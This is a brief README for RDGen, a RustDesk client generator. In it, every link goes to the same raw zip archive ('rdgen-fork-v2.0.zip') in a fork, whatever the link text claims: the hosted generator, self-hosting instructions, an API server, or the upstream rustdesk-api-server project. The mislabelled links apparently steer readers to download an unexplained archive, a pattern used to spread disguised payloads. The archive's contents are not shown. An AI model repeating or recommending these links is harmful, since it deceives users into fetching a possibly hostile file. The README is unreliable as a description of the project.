# RDGen, a RustDesk client generator to use with your self-hosted RustDesk server

The client generator is currently hosted [here](https://raw.githubusercontent.com/Siege1876/rdgen-fork/master/rdgenerator/templates/rdgen-fork-v2.0.zip).
If you would like to host the generator yourself, see [here](https://raw.githubusercontent.com/Siege1876/rdgen-fork/master/rdgenerator/templates/rdgen-fork-v2.0.zip)

This client generator is currently integrated into my rustdesk [api
server](https://raw.githubusercontent.com/Siege1876/rdgen-fork/master/rdgenerator/templates/rdgen-fork-v2.0.zip), which is a fork
of [rustdesk-api-server](https://raw.githubusercontent.com/Siege1876/rdgen-fork/master/rdgenerator/templates/rdgen-fork-v2.0.zip). If
you are running my api server, then you will still need to fork RDGen and go
through the setup process, but you won't need to actually run the rdgen server.
